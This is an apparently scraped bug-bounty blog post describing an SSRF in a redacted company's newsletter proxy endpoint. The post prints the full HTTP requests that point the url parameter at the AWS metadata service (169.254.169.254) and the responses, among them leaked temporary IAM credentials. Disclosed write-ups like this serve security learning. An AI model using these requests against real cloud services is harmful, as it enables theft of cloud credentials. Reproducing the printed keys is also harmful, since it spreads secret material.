---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-06-22_a-tale-of-my-first-ever-full-ssrf-bug.md
original_filename: 2020-06-22_a-tale-of-my-first-ever-full-ssrf-bug.md
title: A tale of my first ever full SSRF bug
category: documents
detected_topics:
- ssrf
- otp
- cloud-security
- idor
- access-control
- xss
tags:
- imported
- documents
- ssrf
- otp
- cloud-security
- idor
- access-control
- xss
language: en
raw_sha256: 7f73fe753e7ea25c31b5949c6763e4482cd43de28b44a6f44d4cb818a65aa2bd
text_sha256: 781fc3b5f7a960110c3cf902ef57ae886a2edcc4b20f9500a9ad5fba8c8a5608
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# A tale of my first ever full SSRF bug

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-06-22_a-tale-of-my-first-ever-full-ssrf-bug.md
- Source Type: markdown
- Detected Topics: ssrf, otp, cloud-security, idor, access-control, xss
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `7f73fe753e7ea25c31b5949c6763e4482cd43de28b44a6f44d4cb818a65aa2bd`
- Text SHA256: `781fc3b5f7a960110c3cf902ef57ae886a2edcc4b20f9500a9ad5fba8c8a5608`


## Content

---
title: "A tale of my first ever full SSRF bug"
url: "https://medium.com/@mase289/a-tale-of-my-first-ever-full-ssrf-bug-4fe71a76e9c4"
authors: ["Jadek Mark (@mase289)"]
bugs: ["SSRF"]
bounty: "1,000"
publication_date: "2020-06-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4475
scraped_via: "browseros"
---

# A tale of my first ever full SSRF bug

Mase289
 highlighted

A tale of my first ever full SSRF bug
Mase289
Follow
4 min read
·
Jun 22, 2020

344

1

After a couple of weeks of futile pocking and probing at web applications on some public programs, I decided to take a break and come back to it with a refreshed mind. In this article, I shall explore a Server Side Request Forgery vulnerability that gave me unrestricted access to the program’s Instance metadata environment. This bug could have disclosed the program’s Aws access keys to an attacker. This has been my most interesting finding to date since embarking on my bug hunting journey.

Press enter or click to view image in full size

I was looking through the HackerOne program directory for a target to hack on when I settled on redacted. (The program was kind enough to let me do this write up on condition that I make the relevant redaction’s).

Looking through their policy page led me to the subdomain https://collate.redacted.com/ which I began exploring for relevant functionalities. At first glance, nothing seemed particularly interesting but scrolling to the bottom of the home page revealed a text box in which a website visitor could submit their email address to subscribe to the company’s newsletter. Nothing too fancy right? I had a hunch to try and understand what kind of requests were being made in the background during the email submission process so I fired up burpsuite , typed in my email address into the text box, and clicked submit.

That’s when things started to get interesting as the request in burpsuite revealed that the email was being routed through a proxy endpoint to an internal mailing list. (I could tell it was MailChimp from the way the URL was structured). The email address was submitted to the back end via the following post request

POST /cloud-app/api/proxy-post?url=https%3A%2F%2Fredacted.eu11.list-manage.com%2Fsubscribe%2Fpost%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 
Host: collate.redacted.com 
Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 
Content-Type: application/x-www-form-urlencoded 
Accept: */* Origin: http://collate.redacted.com 
Referer: http://collate.redacted.com/cloud-app 
Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
Connection: close
b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=foobar@gmail.com

This is what the URL parameter looked like decoded

?url=https://redacted.eu11.list-manage.com/subscribe/post?u=65bd5a1857b73643aad556093

Modifying the URL parameter in the above request with a payload from my burp collaborator client caused the server to make HTTP requests to the supplied collaborator URL. This confirmed my hunch that the application was vulnerable to SSRF.

I then attempted to check whether I was able to do some further internal service enumeration or read local files but had no luck with either. I also tried various protocols such as gopher://, file://, LDAP:// or FTP://. These were unfortunately not supported making http:// and https:// the only two available options.

Get Mase289’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Finally, I pointed the URL parameter to https://169.254.169.254/latest/user-data so I could try and access the applications’ cloud metadata environment. I fired the request and boom! , I received the response with some Amazon EC2 Instance metadata. (Notice the change from a post to get request).

GET /cloud-app/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2Flatest/user-data%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 
Host: collate.redacted.com 
Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 
Content-Type: application/x-www-form-urlencoded 
Accept: */* Origin: http://collate.redacted.com 
Referer: http://collate.redacted.com/cloud-app 
Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
Connection: close
b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=foobar@gmail.com

Response

HTTP/1.1 200 OK 
Date: Sun, 17 May 2020 06:59:20 GMT 
Content-Type: text/html; charset=utf-8 
Content-Length: 66 
Connection: close 
Set-Cookie: AWSALB=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 06:59:20 GMT; Path=/ 
Set-Cookie: AWSALBCORS=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 06:59:20 GMT; Path=/; SameSite=None X-DNS-Prefetch-Control: off 
X-Frame-Options: SAMEORIGIN 
Strict-Transport-Security: max-age=15552000; 
includeSubDomains 
X-Download-Options: noopen 
X-Content-Type-Options: nosniff 
X-XSS-Protection: 1; mode=block 
ETag: W/”42-TCtERKSIzlhv3bS2BY0KADPY5wI” 
Vary: Accept-Encoding 
#!/bin/bash echo ECS_CLUSTER=cloud-app >>/etc/ecs/ecs.config

A quick look at Swissky’s repo allowed me to go through some more AWS endpoints. After accessing the AWS access tokens via the request below, It was time to write up and submit a report.

GET /cloud-app/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 
Host: collate.redacted.com 
Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 
Content-Type: application/x-www-form-urlencoded 
Accept: */* Origin: http://collate.redacted.com 
Referer: http://collate.redacted.com/cloud-app 
Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
Connection: close
b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=foobar@gmail.com

Response

HTTP/1.1 200 OK
Date: Sun, 17 May 2020 07:10:22 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: AWSALB=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 07:10:22 GMT; Path=/
Set-Cookie: AWSALBCORS=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 07:10:22 GMT; Path=/; SameSite=None
X-DNS-Prefetch-Control: off
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
ETag: W/"51e-72BiEi+3aW7IjJYcC8EZFrrQfKQ"
Vary: Accept-Encoding
Content-Length: 1310
{
"Code" : "Success",
"LastUpdated" : "2020-05-17T07:06:54Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "ASIAV6SVWBIP2VKA2AHR",
"SecretAccessKey" : "IC4L8G8VO0H16anm1Fw1FQKJY9IbyTkIE4dIbHUK",
"Token" : "IQoJb3JpZ2luX2VjEHAaCXVzLWVhc3QtMSJIMEYCIQD1lkZWbH1i1R1P8ijIQtkSYkykzY1ylbzVtfa4xt2h7gIhAKIFm9E98JfziETZSJL39G5NEGdsmftFOr0MrAFNg2GqKr0DCLj//////////wEQABoMNDA5Mjc1MzM3MjQ3IgxJCGj22YKawd4HhLUqkQMjg/WFZ5vCZH2BpJn8mPTR3L/p2QnTRyQyyHztHuLOX1JKH9/13ClgWXJSo+oSL+bPxt7cIfFg/dXCDVmhZGifCBh2aMpR8ENWct9kBfZI6ebU7EoXrjtIEZ0NH21kM7qLpHRLWuqNPoKpBTxHnXMt9kGSkvF6KjgcjveJDhJbpzodLMDMFWLd5Q1l/7a9aOTpDzydQVI69CBvzyhHXLm59s61/LFRyfulZaSQe78+BbEPlphj1EudDyXgbwfX/TH5M/r6n2SoA9/37uMFi671pcZUhf+YiWwHzi6tbWbA2UeGPpsNJjzTIWSGgUv8Je/+PIMDsD3zZbn9iVkBwrpfaHsEvg7VglrL9XDU+TYx7RtPjQM86KlvdSlp5Cm2XaMzMd4rcuADG1TpbaCcLJCScgfpPn1Hp1L9NMqdw0eCTRU09DEgIqntokqoCjQXxRYNHsloV7P0/Mv0OSzF0GTARMUBOYV7w6YR5M+Wed5xmWxBKWvKperSiseZaPtFMUBrLNv+CWvg4ZWi3CjqhfNg3DCWxYP2BTrqAVxRGw3KZLei6uiHAWkpSTHK7nJPzavBABylkMy18XkbgdrWB6LmqBX/EtKaXEDpcjb0fWjGCybaOEDuFoJRnMV2o1z05b3iciC06PGqPob0d0ZKqTmd5aB2rzbGA90U30nzk5BYrPA20vRXZdk4xIUZu3YbCYcMF80Fv0XIJPvU1I/n37kdkXN03x5K9SEX5DlH5qH/hZe1p+szm5AA8zjeXkSwX00E48NvwuXmlCF7zoyIg2fukOiBIwSzqCdgGBEjOQ0beAmMh8Dx/zledq/oCU0MpoVdtc2gNAiKqodPVz/17RoCMOKzng==",
"Expiration" : "2020-05-17T13:08:34Z"
}

The feature was disabled after a few hours of my report submission as the program engineers went about remediating the issue.

I was rewarded with a $1,000 bounty over the course of the next months.

Timeline:

May 17, 2020 — Reported.

May 18, 2020 — Triaged.

May 18, 2020— Feature disabled

June 11, 2020 — Bounty awarded
